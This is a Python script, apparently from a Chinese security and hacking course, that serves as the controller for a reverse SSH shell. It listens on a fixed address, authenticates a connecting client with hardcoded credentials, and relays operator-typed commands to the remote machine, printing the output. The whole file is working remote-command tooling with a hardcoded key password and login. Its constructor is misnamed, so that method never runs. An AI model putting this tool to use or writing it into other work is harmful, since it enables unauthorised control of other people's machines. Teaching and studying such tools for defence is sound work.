#!/usr/local/bin/python3
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

import socket
import threading
import paramiko
import sys

#server = sys.argv[1]
server = '202.100.1.224'
#ssh_port = int(sys.argv[2])
ssh_port = 6868

host_key = paramiko.RSAKey.from_private_key_file(filename='id_rsa.key', password='Cisc0123')

class Server(paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'qytanguser') and (password == 'qytangccies'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


def main():
    global server
    global ssh_port
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print("[+] Listening for connection ...")
        client, addr = sock.accept()
    except Exception as e:
        print("[-] Listen Failed: " + str(e))
        sys.exit(1)
    print("[+] Got a connection!")

    try:
        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(host_key)
        server = Server()

        try:
            bhSession.start_server(server=server)
        except paramiko.SSHException as x:
            print("[-] SSH Negotiation Failed.")

        chan = bhSession.accept(20)
        print("[+] Authenticated!")
        print(chan.recv(1024))
        chan.send("Welcome to bh_ssh")
        while True:#输入命令并且要求客户回显结果，遇到exit就退出
            try:
                command = input("Enter Command: ").strip('\n')
                if command != 'exit':
                    chan.send(command.encode())
                    print(chan.recv(1024).decode())
                else:
                    chan.send('exit')
                    print("exiting")
                    bhSession.close()
                    raise Exception ('exit')
            except KeyboardInterrupt:
                bhSession.close()
    except Exception as e:
        print("[-] Caught Exception: " + str(e))
        try:
            bhSession.close()
        except:
            pass
        sys.exit(1)


if __name__ == '__main__':
    main()
